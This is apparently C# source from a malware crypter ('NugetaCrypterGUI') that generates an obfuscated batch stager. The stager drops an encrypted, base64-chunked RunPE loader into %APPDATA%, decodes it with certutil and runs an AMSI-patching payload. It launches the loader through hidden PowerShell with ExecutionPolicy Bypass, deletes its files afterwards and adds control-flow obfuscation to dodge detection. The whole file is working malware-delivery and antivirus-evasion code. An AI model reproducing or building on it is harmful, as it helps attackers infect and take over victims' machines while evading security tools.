using NugetaCrypterGUI.Powershell.Stage1Protection;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Threading;

namespace NugetaCrypterGUI.Powershell
{
    internal class Build
    {

        public static string RunPeLoader()  
        {


            StringBuilder sb = new StringBuilder();
            sb.Append(Files.PowershellRunPeLoader);
            sb.Replace("%CIPHER%", Randomize.Randomize.SourceEncrypt().Item4);
            sb.Replace("%THEKEY%", File.ReadAllText("PowershellKey.txt"));
            sb.Replace("%THEIV%", File.ReadAllText("PowershellIv.txt"));
            byte[] plainbytes = Encoding.UTF8.GetBytes(sb.ToString());
            string b64 = Convert.ToBase64String(plainbytes);
            int chunkSize = (int)Math.Ceiling((double)b64.Length / 20);
            string[] chunks = new string[20];

            for (int i = 0; i < 19; i++)
            {
                chunks[i] = b64.Substring(i * chunkSize, chunkSize);
            }

            chunks[19] = b64.Substring((20 - 1) * chunkSize);
            StringBuilder detach = new StringBuilder();
            foreach (string chunk in chunks)
            {
                detach.AppendLine("echo " + chunk + " >> \"%APPDATA%\\Code.txt\"");
            }
            CreateNoNewLines();
            detach.AppendLine($"powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Enc {CreateNoNewLines()}");
            detach.AppendLine("certutil -decode \"%APPDATA%\\Code.txt\" \"%APPDATA%\\Loader.ps1\"");
            byte[] amsi = Encoding.Unicode.GetBytes(Files.PowershellPatch);
            detach.AppendLine($"powershell -ExecutionPolicy Bypass -NoProfile -WindowStyleHidden -Enc {Convert.ToBase64String(amsi)}");
            detach.AppendLine("powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File \"%APPDATA%\\Loader.ps1\"");
            detach.Append("DEL \"%APPDATA%\\Loader.ps1\"");
            detach.Append("DEL \"%APPDATA%\\Code.txt\"");
            return detach.ToString();
        }

        public static string CreateNoNewLines()
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("$filepath = \"$env:APPDATA\\Code.txt\"");
            sb.AppendLine("$content = Get-Content $filepath");
            sb.AppendLine("$noNewLines = $content -join \"\"");
            sb.AppendLine("$noNewLines | Set-Content $filepath");
            byte[] plainbytes = Encoding.Unicode.GetBytes(sb.ToString());
            string b64 = Convert.ToBase64String(plainbytes);
            return b64;
        }
        public static void Create(string path)
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("@echo off");
            byte[] amsi = Encoding.Unicode.GetBytes(Files.PowershellPatch);
            sb.AppendLine($"powershell -enc {Convert.ToBase64String(amsi)}");
            sb.AppendLine(RunPeLoader());
            string code = Stage1Protection.Obfuscate.RandomSubroutineName(Stage1Protection.Obfuscate.ControlFlow(sb.ToString()));
            File.WriteAllText(path,Stage1Protection.Obfuscate.TrimSpace(code));
        }
    }
}
